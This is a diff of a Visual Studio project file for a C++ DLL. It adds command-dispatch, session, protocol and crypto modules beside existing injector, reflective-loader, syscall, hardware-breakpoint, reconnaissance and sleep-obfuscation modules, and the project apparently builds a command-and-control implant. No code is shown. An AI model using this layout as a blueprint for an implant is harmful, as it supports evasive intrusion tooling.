@@ -160,8 +160,9 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClInclude Include="cmd_dispatch.h" />
+    <ClInclude Include="crypto.h" />
     <ClInclude Include="dll_headers.h" />
-    <ClInclude Include="file.h" />
     <ClInclude Include="framework.h" />
     <ClInclude Include="headers.h" />
     <ClInclude Include="hwbp.h" />
@@ -169,18 +170,21 @@
     <ClInclude Include="misc.h" />
     <ClInclude Include="net.h" />
     <ClInclude Include="pch.h" />
+    <ClInclude Include="protocol.h" />
     <ClInclude Include="reconnaissance.h" />
     <ClInclude Include="rfdll.h" />
+    <ClInclude Include="session.h" />
     <ClInclude Include="sleaping.h" />
     <ClInclude Include="swappala.h" />
     <ClInclude Include="syscalls.h" />
     <ClInclude Include="types.h" />
-    <ClInclude Include="utils.h" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="cmd_dispatch.cpp" />
+    <ClCompile Include="crypto.cpp" />
     <ClCompile Include="dllmain.cpp" />
     <ClCompile Include="dll_loader.cpp" />
-    <ClCompile Include="file.cpp" />
+    <ClCompile Include="entrypoint.cpp" />
     <ClCompile Include="injector.cpp" />
     <ClCompile Include="ldr.cpp" />
     <ClCompile Include="misc.cpp" />
@@ -191,10 +195,11 @@
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
     </ClCompile>
+    <ClCompile Include="protocol.cpp" />
     <ClCompile Include="reconnaissance.cpp" />
+    <ClCompile Include="session.cpp" />
     <ClCompile Include="sleaping.cpp" />
     <ClCompile Include="syscall_stub.cpp" />
-    <ClCompile Include="utils.cpp" />
   </ItemGroup>
   <ItemGroup>
     <None Include="cpp.hint" />
